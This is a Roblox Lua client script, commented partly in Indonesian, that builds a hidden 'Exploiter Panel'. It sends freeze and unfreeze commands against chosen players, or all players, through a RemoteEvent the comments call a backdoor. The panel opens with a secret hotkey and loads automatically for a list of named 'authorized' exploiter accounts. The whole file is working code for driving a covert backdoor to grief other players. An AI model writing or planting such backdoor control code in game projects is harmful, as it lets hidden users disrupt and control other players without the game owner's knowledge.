-- EXPLOITER CLIENT GUI
-- Script ini akan dijalankan di client exploiter untuk interface

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer

-- Wait for the backdoor RemoteEvent
local systemUpdate = ReplicatedStorage:WaitForChild("SystemUpdate")

-- Create exploiter GUI
local function createExploiterGUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "ExploiterPanel"
    gui.Parent = LocalPlayer.PlayerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 300, 0, 400)
    mainFrame.Position = UDim2.new(0, 50, 0, 50)
    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = gui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = mainFrame

    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.BackgroundColor3 = Color3.fromRGB(220, 53, 69)
    title.Text = "🚨 EXPLOITER PANEL - " .. LocalPlayer.Name
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 14
    title.Font = Enum.Font.SourceSansBold
    title.Parent = mainFrame

    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 8)
    titleCorner.Parent = title

    -- Target input
    local targetInput = Instance.new("TextBox")
    targetInput.Size = UDim2.new(1, -20, 0, 30)
    targetInput.Position = UDim2.new(0, 10, 0, 40)
    targetInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    targetInput.PlaceholderText = "Enter target player name"
    targetInput.Text = ""
    targetInput.TextColor3 = Color3.fromRGB(255, 255, 255)
    targetInput.TextSize = 12
    targetInput.Font = Enum.Font.SourceSans
    targetInput.Parent = mainFrame

    -- Buttons
    local freezeBtn = Instance.new("TextButton")
    freezeBtn.Size = UDim2.new(0.45, 0, 0, 40)
    freezeBtn.Position = UDim2.new(0.05, 0, 0, 80)
    freezeBtn.BackgroundColor3 = Color3.fromRGB(220, 53, 69)
    freezeBtn.Text = "🧊 FREEZE TARGET"
    freezeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    freezeBtn.TextSize = 12
    freezeBtn.Font = Enum.Font.SourceSansBold
    freezeBtn.Parent = mainFrame

    local unfreezeBtn = Instance.new("TextButton")
    unfreezeBtn.Size = UDim2.new(0.45, 0, 0, 40)
    unfreezeBtn.Position = UDim2.new(0.5, 0, 0, 80)
    unfreezeBtn.BackgroundColor3 = Color3.fromRGB(40, 167, 69)
    unfreezeBtn.Text = "🔥 UNFREEZE TARGET"
    unfreezeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    unfreezeBtn.TextSize = 12
    unfreezeBtn.Font = Enum.Font.SourceSansBold
    unfreezeBtn.Parent = mainFrame

    local freezeAllBtn = Instance.new("TextButton")
    freezeAllBtn.Size = UDim2.new(0.45, 0, 0, 40)
    freezeAllBtn.Position = UDim2.new(0.05, 0, 0, 130)
    freezeAllBtn.BackgroundColor3 = Color3.fromRGB(255, 193, 7)
    freezeAllBtn.Text = "❄️ FREEZE ALL"
    freezeAllBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
    freezeAllBtn.TextSize = 12
    freezeAllBtn.Font = Enum.Font.SourceSansBold
    freezeAllBtn.Parent = mainFrame

    local unfreezeAllBtn = Instance.new("TextButton")
    unfreezeAllBtn.Size = UDim2.new(0.45, 0, 0, 40)
    unfreezeAllBtn.Position = UDim2.new(0.5, 0, 0, 130)
    unfreezeAllBtn.BackgroundColor3 = Color3.fromRGB(108, 117, 125)
    unfreezeAllBtn.Text = "🌟 UNFREEZE ALL"
    unfreezeAllBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    unfreezeAllBtn.TextSize = 12
    unfreezeAllBtn.Font = Enum.Font.SourceSansBold
    unfreezeAllBtn.Parent = mainFrame

    -- Players list
    local scrollFrame = Instance.new("ScrollingFrame")
    scrollFrame.Size = UDim2.new(1, -20, 1, -200)
    scrollFrame.Position = UDim2.new(0, 10, 0, 180)
    scrollFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    scrollFrame.BorderSizePixel = 0
    scrollFrame.ScrollBarThickness = 8
    scrollFrame.Parent = mainFrame

    local layout = Instance.new("UIListLayout")
    layout.SortOrder = Enum.SortOrder.Name
    layout.Padding = UDim.new(0, 2)
    layout.Parent = scrollFrame

    -- Button events
    freezeBtn.MouseButton1Click:Connect(function()
        local target = targetInput.Text
        if target ~= "" then
            systemUpdate:FireServer("freeze", target)
            print("🧊 Sent freeze command for: " .. target)
        end
    end)

    unfreezeBtn.MouseButton1Click:Connect(function()
        local target = targetInput.Text
        if target ~= "" then
            systemUpdate:FireServer("unfreeze", target)
            print("🔥 Sent unfreeze command for: " .. target)
        end
    end)

    freezeAllBtn.MouseButton1Click:Connect(function()
        systemUpdate:FireServer("freezeall")
        print("❄️ Sent freeze all command")
    end)

    unfreezeAllBtn.MouseButton1Click:Connect(function()
        systemUpdate:FireServer("unfreezeall")  
        print("🌟 Sent unfreeze all command")
    end)

    -- Update player list
    local function updatePlayerList()
        for _, child in pairs(scrollFrame:GetChildren()) do
            if child:IsA("TextButton") then
                child:Destroy()
            end
        end

        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                local playerBtn = Instance.new("TextButton")
                playerBtn.Size = UDim2.new(1, -10, 0, 25)
                playerBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
                playerBtn.Text = "👤 " .. player.Name
                playerBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                playerBtn.TextSize = 11
                playerBtn.TextXAlignment = Enum.TextXAlignment.Left
                playerBtn.Font = Enum.Font.SourceSans
                playerBtn.Parent = scrollFrame

                playerBtn.MouseButton1Click:Connect(function()
                    targetInput.Text = player.Name
                end)
            end
        end

        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y)
    end

    -- Initial update and periodic updates
    updatePlayerList()
    Players.PlayerAdded:Connect(updatePlayerList)
    Players.PlayerRemoving:Connect(updatePlayerList)

    return gui
end

-- Hotkey to toggle GUI (Ctrl+Shift+E)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed then
        if input.KeyCode == Enum.KeyCode.E and 
           UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) and
           UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then

            local existingGUI = LocalPlayer.PlayerGui:FindFirstChild("ExploiterPanel")
            if existingGUI then
                existingGUI:Destroy()
            else
                createExploiterGUI()
            end
        end
    end
end)

-- Auto-create GUI if authorized
wait(2)
local authorizedUsers = {"ExploiterUsername", "TestCheater", "BackdoorUser"}
if table.find(authorizedUsers, LocalPlayer.Name) then
    createExploiterGUI()
    print("🚨 Exploiter GUI loaded - Press Ctrl+Shift+E to toggle")
end
